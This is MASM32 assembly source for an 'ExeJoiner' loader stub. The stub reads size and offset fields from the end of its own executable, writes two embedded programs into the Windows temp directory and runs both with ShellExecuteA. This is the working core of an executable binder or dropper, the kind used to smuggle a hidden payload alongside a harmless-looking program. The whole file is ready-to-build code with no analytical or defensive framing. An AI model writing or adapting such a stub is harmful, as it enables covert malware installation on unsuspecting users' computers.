; ExeJoiner - Loader

.386
.model flat, stdcall
option casemap:none

include \masm32\include\kernel32.inc
includelib \masm32\lib\kernel32.lib
include \masm32\include\user32.inc
includelib \masm32\lib\user32.lib
include \masm32\include\shell32.inc
includelib \masm32\lib\shell32.lib

include \masm32\include\windows.inc
include structs.inc

.const
szOpen          db "open",0

.data
cTempDir        db MAX_PATH dup (0)
cExePath        db MAX_PATH dup (0)
sSplitInfo      Infos <>
dwBytesRead     dd 0
dwBytesWritten  dd 0
dwBuff          dd 0
pMem            dd 0
bCanExec        db 0

.code
main:
	; get the windows temp directory
	invoke GetTempPath,sizeof cTempDir,offset cTempDir
	add eax,offset cTempDir
	mov byte ptr [eax],'\'
	
	; get the split infos
	invoke GetModuleFileNameA,NULL,offset cExePath,sizeof cExePath 
	invoke CreateFileA,offset cExePath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,\
	                  FILE_ATTRIBUTE_NORMAL,0
	cmp eax,INVALID_HANDLE_VALUE
	jz Exit
	mov sSplitInfo.hExeFile,eax
	invoke GetFileSize,eax,0
	cmp eax,-1
	jz Exit
	mov sSplitInfo.dwExeSize,eax
	mov ebx,eax
	sub ebx,4
	invoke SetFilePointer,sSplitInfo.hExeFile,ebx,NULL,FILE_BEGIN
	invoke ReadFile,sSplitInfo.hExeFile,offset sSplitInfo.dwFsize1,4,offset dwBytesRead,NULL
	sub ebx,4
	invoke SetFilePointer,sSplitInfo.hExeFile,ebx,NULL,FILE_BEGIN
	invoke ReadFile,sSplitInfo.hExeFile,offset sSplitInfo.dwOffset1,4,offset dwBytesRead,NULL
	sub ebx,4
	invoke SetFilePointer,sSplitInfo.hExeFile,ebx,NULL,FILE_BEGIN
	invoke ReadFile,sSplitInfo.hExeFile,offset sSplitInfo.dwFsize2,4,offset dwBytesRead,NULL
	sub ebx,4
	invoke SetFilePointer,sSplitInfo.hExeFile,ebx,NULL,FILE_BEGIN
	invoke ReadFile,sSplitInfo.hExeFile,offset sSplitInfo.dwOffset2,4,offset dwBytesRead,NULL	
	
	; check the data
	cmp sSplitInfo.dwFsize1,0
	jz Exit_and_Clean1
	cmp sSplitInfo.dwOffset1,0
	jz Exit_and_Clean1
	cmp sSplitInfo.dwFsize2,0
	jz Exit_and_Clean1
	cmp sSplitInfo.dwOffset2,0
	jz Exit_and_Clean1
	
	; create the 2 files in the windows temp directory
	; process the first file
	invoke lstrcat,offset cTempDir,offset sSplitInfo.szFname1
	invoke CreateFileA,offset cTempDir,GENERIC_WRITE + GENERIC_READ,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,\
	                   FILE_ATTRIBUTE_NORMAL,0
	cmp eax,INVALID_HANDLE_VALUE
	jz Exit_and_Clean1
	mov sSplitInfo.hFile1,eax
	invoke SetFilePointer,sSplitInfo.hExeFile,sSplitInfo.dwOffset1,NULL,0
	invoke GlobalAlloc,GMEM_ZEROINIT + GMEM_FIXED,sSplitInfo.dwFsize1
	cmp eax,NULL
	jz Exit_and_Clean2
	mov pMem,eax	
	invoke ReadFile,sSplitInfo.hExeFile,eax,sSplitInfo.dwFsize1,offset dwBytesRead,NULL
	invoke WriteFile,sSplitInfo.hFile1,pMem,sSplitInfo.dwFsize1,offset dwBytesWritten,NULL
	invoke GlobalFree,pMem ; clean up

	; process the second file
	invoke lstrlen,offset cTempDir
	mov edx,offset cTempDir
	add edx,eax
	sub edx,5
	mov byte ptr [edx],'2'
	invoke CreateFileA,offset cTempDir,GENERIC_WRITE + GENERIC_READ,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,\
	                   FILE_ATTRIBUTE_NORMAL,0
	cmp eax,INVALID_HANDLE_VALUE
	jz Exit_and_Clean2
	mov sSplitInfo.hFile2,eax
	invoke SetFilePointer,sSplitInfo.hExeFile,sSplitInfo.dwOffset2,NULL,0
	invoke GlobalAlloc,GMEM_ZEROINIT + GMEM_FIXED,sSplitInfo.dwFsize2
	cmp eax,NULL
	jz Exit_and_Clean3
	mov pMem,eax	
	invoke ReadFile,sSplitInfo.hExeFile,eax,sSplitInfo.dwFsize2,offset dwBytesRead,NULL
	invoke WriteFile,sSplitInfo.hFile2,pMem,sSplitInfo.dwFsize2,offset dwBytesWritten,NULL
	invoke GlobalFree,pMem ; clean up	
	
	mov bCanExec,TRUE
	
Exit_and_Clean3:
	invoke CloseHandle,sSplitInfo.hFile2
Exit_and_Clean2:
	invoke CloseHandle,sSplitInfo.hFile1
Exit_and_Clean1:
      	invoke CloseHandle,sSplitInfo.hExeFile
Exit:
	.IF bCanExec==TRUE
	   call ExecFiles
	.ENDIF
	invoke ExitProcess,0
	
ExecFiles proc
	invoke ShellExecuteA,0,offset szOpen,offset cTempDir,NULL,NULL,SW_SHOWNORMAL
	invoke lstrlen,offset cTempDir
	add eax,offset cTempDir
	sub eax,5
	mov byte ptr [eax],'1'
	invoke ShellExecuteA,0,offset szOpen,offset cTempDir,NULL,NULL,SW_SHOWNORMAL
	ret
ExecFiles endp

end main
